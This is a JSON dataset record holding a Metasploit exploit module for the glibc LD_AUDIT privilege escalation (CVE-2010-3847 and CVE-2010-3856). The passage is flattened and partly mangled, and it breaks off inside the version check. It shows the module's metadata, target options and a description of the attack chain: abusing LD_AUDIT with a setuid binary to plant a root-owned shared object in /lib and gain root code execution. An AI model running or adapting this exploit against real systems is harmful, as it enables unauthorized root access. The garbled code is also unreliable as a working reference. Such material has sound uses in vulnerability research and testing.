{
    "text": "vul_name : glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation ， vul_cve : CVE-2010-3847 , CVE-2010-3856 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core/exploit/local/linux' ， require 'msf/core/exploit/exe' ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， include Msf : Exploit : Local : Linux ， super ( update_info ( info ,  ， 'Name' => 'glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation' ,  ， 'Description' => %q{ ， This module attempts to gain root privileges on Linux systems by abusing ， a vulnerability in the GNU C Library ( glibc ) dynamic linker. ， glibc ld.so in versions before 2.11.3 , and 2.12.x before 2.12.2 does not ， properly restrict use of the LD_AUDIT environment variable when loading ， setuid executables. This allows loading arbitrary shared objects from ， the trusted library search path with the privileges of the suid user. ， This module uses LD_AUDIT to load the libpcprofile.so shared object ,  ， distributed with some versions of glibc , and leverages arbitrary file ， creation functionality in the library constructor to write a root-owned ， world-writable file to a system trusted search path ( usually /lib ) . ， The file is then overwritten with a shared object then loaded with ， LD_AUDIT resulting in arbitrary code execution. ， This module has been tested successfully on glibc version 2.11.1 on ， Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386. ， RHEL 5 is reportedly affected , but untested. Some glibc distributions ， do not contain the libpcprofile.so library required for successful ， exploitation. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Tavis Ormandy' ,  # Discovery and exploit ， 'zx2c4' ,  # \"I Can't Read and I Won't Race You Either\" exploit ， 'Marco Ivaldi' ,  # raptor_ldaudit and raptor_ldaudit2 exploits ， 'Todor Donev' ,  # libmemusage.so exploit ， 'Brendan Coles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => 'Oct 18 2010' ,  ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , { } ]  ,  ，  [ 'Linux x86' , { 'Arch' => ARCH_X86 } ]  ,  ，  [ 'Linux x64' , { 'Arch' => ARCH_X64 } ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， ' ，  [  ，  [ 'CVE' , '2010-3847' ]  ,  ，  [ 'CVE' , '2010-3856' ]  ,  ，  [ 'BID' , '44154' ]  ,  ，  [ 'BID' , '44347' ]  ,  ，  [ 'EDB' , '15274' ]  ,  ，  [ 'EDB' , '15304' ]  ,  ，  [ 'EDB' , '18105' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ， register_options (  ，  [  ， OptString.new ( 'SUID_EXECUTABLE' ,  [ true , 'Path to a SUID executable' , '/bin/ping' ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  )  ， end ， def base_dir ， datastore [ 'WritableDir' ]  ， end ， def suid_exe_path ， datastore [ 'SUID_EXECUTABLE' ]  ， end ， def check ， glibc_banner = cmd_exec 'ldd -version' ， glibc_version = Gem : Version.new glibc_banner.scan ( /^ldd\\s+\\ ( . * \\ ) \\s+ (  [ \\d\\. ] + ) / ) .flatten.first ， vprint_error 'Could not determine the GNU C library version'",
    "time": "2018.02.11"
}